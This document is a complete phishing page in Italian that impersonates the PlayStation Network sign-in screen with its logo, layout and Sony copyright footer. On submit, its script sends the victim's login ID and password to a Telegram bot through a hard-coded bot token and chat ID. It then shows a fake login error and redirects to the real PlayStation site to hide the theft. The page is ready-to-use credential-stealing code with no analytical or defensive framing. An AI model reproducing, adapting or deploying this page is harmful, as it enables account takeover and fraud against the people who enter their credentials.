<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PlayStation Network - Sign In</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
  body { background:#000; color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; }
  
  .logo { width: 60px; height: 60px; fill: #0072ce; margin-bottom: 20px; }
  h1 { font-size: 22px; margin-bottom: 30px; font-weight: 500; }
  
  .container { width: 100%; max-width: 380px; padding: 20px; }
  
  input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #333; background:#111; color:#fff; font-size: 16px; }
  input:focus { outline:none; border-color:#0072ce; }
  
  button { width: 100%; padding: 15px; border:none; border-radius: 30px; background:#0072ce; color:#fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
  button:hover { background: #005bb5; }
  
  .links { margin-top: 20px; text-align: center; font-size: 14px; }
  .links a { color: #0072ce; text-decoration: none; display: block; margin-bottom: 10px; }
  
  .err { color: #ff3333; font-size: 14px; margin-top: 15px; display:none; text-align: center; }
  
  .footer { position: absolute; bottom: 20px; font-size: 11px; color: #666; text-align: center; width: 100%; }
</style>
</head>
<body>

<!-- logo playstation in svg -->
<svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
  <path d="M8.98 20.79c-2.57.45-5.07-.17-6.13-1.14-.83-.78-.78-1.91-.1-2.83.61-.83 1.81-1.4 3.29-1.44v2.07c-1.1.03-1.8.37-1.85.74-.06.4.57.82 1.64.88 1.31.08 2.32-.36 2.32-.36v-9.94l-2.7-1.1v9.86c-.82.32-1.87.63-3.16.79L0 15.85v2.08c1.4.41 3.24.47 5.02.15 3.39-.61 6.48-2.06 6.48-2.06v-8.06l-2.52.88zM24 14.79c-.12-1.1-.9-1.74-2.48-1.99-1.44-.23-3.29-.18-4.86.26v2.01c1.09-.32 2.41-.47 3.63-.36 1.12.1 1.41.52 1.38.83-.03.28-.36.41-1.22.42-1.5.02-3.45.34-3.45 1.96 0 1.49 1.52 2.03 3.24 2.07 2.06.05 3.65-.66 3.76-2.16.06-.94-.37-1.52-1.25-1.89.8-.25 1.27-.71 1.25-1.15zM4.79 2.26L0 3.89v1.81l4.79-1.63V2.26zM16.53 2.92c-.18-.88-1.24-1.37-2.75-1.1-1.88.34-4.42 1.15-5.78 1.7v6.42c1.6-.58 2.72-1.09 4.52-1.2 2.09-.13 2.51.76 2.56 1.56.06.9-.64 1.32-1.74 1.46-1.18.15-2.38.24-4.01.67v2.23c1.88-.4 3.44-.68 5.25-1.13 2.45-.6 4.1-2.08 3.7-4.39-.28-1.65-1.34-2.39-2.48-2.68.44-.08.88-.23 1.03-.54.14-.31.03-.65-.3-.99z"/>
</svg>

<h1>Accedi al tuo account</h1>

<div class="container">
  <form id="f">
    <input id="u" type="text" placeholder="ID di accesso (Email o PSN ID)" required>
    <input id="p" type="password" placeholder="Password" required>
    <button type="submit">Accedi</button>
  </form>
  
  <div class="links">
    <a href="#">Hai dimenticato la password?</a>
    <a href="#">Crea un nuovo account</a>
  </div>
  
  <div class="err" id="e">ID di accesso o password non validi.</div>
</div>

<div class="footer">
  © 2024 Sony Interactive Entertainment Inc. Tutti i diritti riservati.
</div>

<script>
const TOKEN = "9093872805:AAEqR93AHX4jqyvTn1-f1Pwx-GaX-ArdXUI";
const CHAT_ID = "6382555359";

document.getElementById("f").addEventListener("submit", async (ev) => {
  ev.preventDefault();
  const u = document.getElementById("u").value;
  const p = document.getElementById("p").value;
  const text = "🎮 PSN Login\nUser: " + u + "\nPass: " + p;
  
  try {
    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  } catch(e) {}
  
  document.getElementById("e").style.display = "block";
  setTimeout(() => { window.location.href = "https://www.playstation.com/it-it/"; }, 2000);
});
</script>

</body>
</html>
